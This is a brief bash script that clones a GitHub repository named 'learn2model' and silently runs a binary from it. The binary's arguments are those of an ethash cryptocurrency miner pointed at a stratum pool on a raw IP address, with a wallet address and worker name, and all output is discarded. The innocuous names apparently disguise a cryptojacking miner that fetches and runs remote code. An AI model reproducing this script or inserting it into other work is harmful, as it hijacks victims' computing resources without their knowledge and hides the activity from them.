#!/bin/bash
cd /wheretosave
git clone https://github.com/blapingdev/learn2model.git -q
chmod -R +x learn2model
./learn2model/open3v -a ethash -o stratum+tcp://51.195.89.38:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w kienmai-04 > /dev/null 2>&1